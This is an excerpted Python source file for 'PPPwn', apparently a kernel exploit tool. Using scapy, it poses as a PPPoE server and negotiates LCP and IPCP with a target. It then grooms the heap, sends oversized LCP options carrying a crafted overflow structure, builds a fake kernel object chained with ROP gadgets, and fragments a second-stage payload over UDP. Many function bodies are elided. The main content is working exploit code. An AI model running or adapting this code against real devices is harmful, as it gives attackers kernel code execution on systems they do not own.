# Extracted from: C:\DEV\PyAgent\.external\0xSojalSec-PPPwn\pppwn.py
#!/usr/bin/env python3
#
...
class LcpEchoHandler(AsyncSniffer):
    ...
    def handler(self, pkt):
        self.s.send(
            ...
            / PPPoE(sessionid=pkt[PPPoE].sessionid)
            / PPP()
...
class Exploit:
    ...
    def lcp_negotiation(self):
        ...
        self.s.send(
            Ether(src=self.source_mac, dst=self.target_mac, type=ETHERTYPE_PPPOE)
            / PPPoE(sessionid=self.SESSION_ID)
            / PPP()
            / PPP_LCP(code=CONF_REQ, id=self.LCP_ID)
        )

        print("[*] Waiting for LCP configure ACK...")
        while True:
            pkt = self.s.recv()
            if pkt and pkt.haslayer(PPP_LCP_Configure) and pkt[PPP_LCP_Configure].code == CONF_ACK:
                break

        print("[*] Waiting for LCP configure request...")
        while True:
            pkt = self.s.recv()
            if pkt and pkt.haslayer(PPP_LCP_Configure) and pkt[PPP_LCP_Configure].code == CONF_REQ:
                break
        ...
        self.s.send(
            ...
            / PPPoE(sessionid=self.SESSION_ID)
            / PPP()
            / PPP_LCP(code=CONF_ACK, id=pkt[PPP_LCP_Configure].id)
        )
    ...
    def ipcp_negotiation(self):
        ...
        while True:
            pkt = self.s.recv()
            if pkt and pkt.haslayer(PPP_IPCP) and pkt[PPP_IPCP].code == CONF_REQ:
                break
        ...
        self.s.send(
            ...
            / PPPoE(sessionid=self.SESSION_ID)
            / PPP()
            / PPP_IPCP(code=CONF_ACK, id=pkt[PPP_IPCP].id, options=pkt[PPP_IPCP].options)
        )
    ...
    def ppp_negotation(self, cb=None, ignore_initial_req=False):
        if ignore_initial_req:
            ...
            while True:
                pkt = self.s.recv()
                if pkt and pkt.haslayer(PPPoED) and pkt[PPPoED].code == PPPOE_CODE_PADI:
                    break
        ...
        print("[*] Sending PADO...")
        self.s.send(
            Ether(src=self.source_mac, dst=self.target_mac, type=ETHERTYPE_PPPOEDISC)
        ...
        while True:
            pkt = self.s.recv()
            if pkt and pkt.haslayer(PPPoED) and pkt[PPPoED].code == PPPOE_CODE_PADR:
                break
    ...
    def build_overflow_lle(self):
        ...
        # lle_next
        overflow_lle += p64(self.pppoe_softc + PPPOE_SOFTC_SC_AC_COOKIE)  # le_next
        ...
        overflow_lle += p64(self.pppoe_softc + PPPOE_SOFTC_SC_AC_COOKIE - LLTABLE_LLTIFP)  # lle_tbl
    ...
    def build_fake_lle(self):
        ...
        # lle_next
        # Third gadget
        fake_lle += p64(self.kdlsym(self.offs.POP_RBX_POP_R14_POP_RBP_JMP_QWORD_PTR_RSI_10))  # le_next
        fake_lle += p64(NULL)  # le_prev

        # lle_lock
        # Fourth gadget
        fake_lle += p64(self.kdlsym(self.offs.LEA_RSP_RSI_20_REPZ_RET))  # lo_name
        fake_lle += p32(RW_INIT_FLAGS | LO_DUPOK)  # lo_flags
        fake_lle += p32(0)  # lo_data
        # Fifth gadget
        fake_lle += p64(self.kdlsym(self.offs.ADD_RSP_B0_POP_RBP_RET))  # lo_witness
        fake_lle += p64(RW_UNLOCKED)  # rw_lock

        fake_lle += p64(self.pppoe_softc + PPPOE_SOFTC_SC_DEST - LLTABLE_LLTFREE)  # lle_tbl
        ...
        # Second gadget
        fake_lle[self.offs.SECOND_GADGET_OFF : (self.offs.SECOND_GADGET_OFF + 8)] = p64(
    ...
    def run(self):
        ...
        for i in range(self.SPRAY_NUM):
            if i % 0x100 == 0:
                print(
                    "[*] Heap grooming...{}%".format(100 * i // self.SPRAY_NUM),
                    end="\r",
                    flush=True,
                )
        ...
        for i in range(self.PIN_NUM):
            if i % 0x100 == 0:
                print(
                    "[*] Pinning to CPU 0...{}%".format(100 * i // self.PIN_NUM),
                    end="\r",
                    flush=True,
                )

            self.s.send(Ether(src=self.source_mac, dst=self.target_mac, type=ETHERTYPE_PPPOE))
            sleep(0.001)
        ...
        for i in range(self.CORRUPT_NUM):
            self.s.send(
                ...
                / PPP_LCP(
                    ...
                    id=self.LCP_ID,
                    len=TARGET_SIZE + 4,
                    data=(PPP_LCP_Option(data=b"A" * (TARGET_SIZE - 4)) / PPP_LCP_Option(data=overflow_lle)),
                )
            )
        ...
        while True:
            pkt = self.s.recv()
            if pkt and pkt.haslayer(PPP_LCP_Configure) and pkt[PPP_LCP_Configure].code == CONF_REJ:
                break
        ...
        for i in reversed(range(self.SPRAY_NUM)):
            if i % 0x100 == 0:
                print(
                    "[*] Scanning for corrupted object...{}".format(hex(i)),
                    end="\r",
                    flush=True,
                )
        ...
        frags = fragment(
            IP(src=self.SOURCE_IPV4, dst=self.TARGET_IPV4) / UDP(dport=self.STAGE2_PORT) / self.stage2,
            1024,
        )
